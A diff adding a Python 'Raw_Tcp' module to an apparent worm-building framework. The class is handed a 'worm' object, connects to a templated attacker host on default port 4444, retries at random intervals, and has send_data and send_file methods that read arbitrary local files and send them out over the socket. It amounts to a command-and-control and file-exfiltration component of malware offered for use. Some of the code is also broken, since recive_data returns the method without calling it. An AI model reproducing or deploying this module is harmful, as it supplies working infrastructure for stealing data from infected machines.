@@ -1,0 +1,107 @@
+#!name##Raw_Tcp
+#!types##module
+#!info##A simple module that allows socket TCP communication. Transmits raw bytes.
+#!reqVar##IP_ADDR##Host address.##str
+#!reqVar##RT_port##Host port number##int
+#!setVar##RT_port##4444##int
+#!reqVar##RT_format_code##Message encoding format.##str
+#!setVar##RT_format_code##utf-8##str
+
+import socket
+from threading import Thread
+from random import randint
+from time import sleep
+from typing import Union
+
+class Raw_Tcp(Thread):
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        super().__init__()
+        self.worm = worm
+        self.addr = ("{{IP_ADDR}}", {{RT_port}})
+        self.format = "{{RT_format_code}}"
+        self.is_conn = False
+
+    def _conn(self) -> bool:
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect(self.addr)
+            self.is_conn = True
+            return True
+        except (ConnectionError, ConnectionAbortedError, ConnectionResetError):
+            self.is_conn = False
+            return False
+    
+    def conn(self) -> None:
+        while self.worm.working:
+            if self._conn():
+                self.check_conn()
+                break
+            sleep(randint(2, 7))
+    
+    def _check_conn(self) -> None:
+        self.client.settimeout(3)
+        while self.is_conn:
+            data = b""
+            try:
+                recv = self.client.recv(16)
+            except TimeoutError:
+                continue
+            except (ConnectionAbortedError, ConnectionError, ConnectionResetError):
+                break
+            if not recv:
+                break   
+            sleep(2)
+        self.is_conn = False
+
+    
+    def check_conn(self) -> None:
+        cc = Thread(target=self._check_conn, daemon=True)
+        cc.start()
+
+    
+    def _recive_data(self) -> Union[None, bytes]:
+        if not self.is_conn:
+            return None
+        try:
+            data = self.client.recv(1024)
+            if data:
+                return data
+            else:
+                return None
+        except (ConnectionError, ConnectionResetError, ConnectionAbortedError):
+            return None
+    
+    def recive_data(self) -> Union[None, bytes]:
+        return self._recive_data
+    
+    def _send_data(self, data: str) -> None:
+        data = data.encode(self.format)
+        try:
+            self.client.sendall(data)
+        except (ConnectionError, ConnectionAbortedError, ConnectionResetError):
+            pass
+    
+    def send_msg(self, data: str) -> None:
+        self._send_data(data)
+    
+    def send_data(self, data: str) -> None:
+        self._send_data(data)
+    
+    def send_file(self, fpath: str, *args) -> None:
+        try:
+            with open(fpath, "rb") as f:
+                self.client.sendfile(f, 0)
+        except:
+            pass
+    
+    
+    def run(self) -> None:
+        self.conn()
+
+    
+
+    
+
+                
+
